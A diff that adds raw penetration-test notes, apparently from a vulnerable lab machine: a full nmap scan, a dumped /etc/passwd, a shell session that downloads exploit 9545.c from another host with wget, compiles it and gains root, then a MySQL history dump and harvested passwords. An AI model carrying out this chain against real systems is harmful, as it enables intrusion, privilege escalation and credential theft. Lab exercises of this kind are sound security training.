@@ -1,0 +1,185 @@
+
+
+root@ap:~# nmap -A -p- 192.168.43.66
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 19:20 CET
+Nmap scan report for 192.168.43.66
+Host is up (0.00047s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind    2 (RPC #100000)
+443/tcp  open  ssl/https?
+|_ssl-date: 2020-01-15T16:11:19+00:00; -2h09m50s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+631/tcp  open  ipp        CUPS 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+683/tcp  open  status     1 (RPC #100024)
+3306/tcp open  mysql      MySQL (unauthorized)
+MAC Address: 94:65:9C:AC:53:3C (Intel Corporate)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: -2h09m50s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.47 ms 192.168.43.66
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.93 seconds
+
+
+
+
+
+<!-- Start of HTML when logged in as Administator -->
+
+
+rtt min/avg/max/mdev = 0.029/0.046/0.059/0.013 ms, pipe 2
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+rpm:x:37:37::/var/lib/rpm:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+squid:x:23:23::/var/spool/squid:/sbin/nologin
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+john:x:500:500::/home/john:/bin/bash
+harold:x:501:501::/home/harold:/bin/bash
+
+
+
+ash-3.00$ wget 192.168.43.254:1234/9545.c
+--12:26:16--  http://192.168.43.254:1234/9545.c
+           => `9545.c'
+Connecting to 192.168.43.254:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9,783 (9.6K) [text/plain]
+
+    0K .........                                             100%  266.57 MB/s
+
+12:26:16 (266.57 MB/s) - `9545.c' saved [9783/9783]
+
+bash-3.00$ ls
+9545.c
+bash-3.00$ gcc 9545.c
+9545.c:376:28: warning: no newline at end of file
+bash-3.00$ ls
+9545.c
+a.out
+bash-3.00$ ./a.out
+sh: no job control in this shell
+sh-3.00# ls
+9545.c
+a.out
+sh-3.00# 
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+sh-3.00# 
+
+
+
+sh-3.00# cat .mysql_history
+show databases;
+create database webapp;
+use webapp;
+create table users(id INT,username varchar(100),password varchar(10));
+show database;
+select * from users;
+show databases;
+use webapp;
+insert into users values(1,'admin','hello');
+select * from users;
+use mysql
+show databases;
+use mysql;
+select * from users where user=john;
+show tables;
+select * from user where user=john;
+select * from user where user='john';
+select * from user;
+create user 'john'@'localhost' identified by 'hiroshima';
+create user 'webapp'@'localhost' identified by 'hiroshima';
+create user 'webapp'@'localhost' IDENTIFIED BY 'hiroshima';
+CREATE USER 'webapp'@'localhost' identified by 'hiroshima';
+update user set password = password('hiroshima') where user = 'john';
+use mysql;
+show users;
+select * from user;
+create user 'john'@'localhost' identified by 'hiroshima';
+version;
+-v
+;
+help
+flush privileges;
+show databases;
+use mysql;
+grant select,insert,update,delete on *.* to 'john'@'localhost';
+update user set password = password('hiroshima') where user = 'john';
+flush priveleges;
+use webapp;
+show tables;
+update user set password = password('Ha56!blaKAbl') where user = 'admin';
+update username set password = password('Ha56!blaKAbl') where user = 'admin';
+select * from users;
+update username set password = password('Ha56!blaKAbl') where username = 'admin';
+update users set password = password('Ha56!blaKAbl') where username = 'admin';
+select * from users;
+insert into users values(2,'john','66lajGGbla');
+select * from users;
+
+
+john:hiroshima
+admin:Ha56!blaKAbl
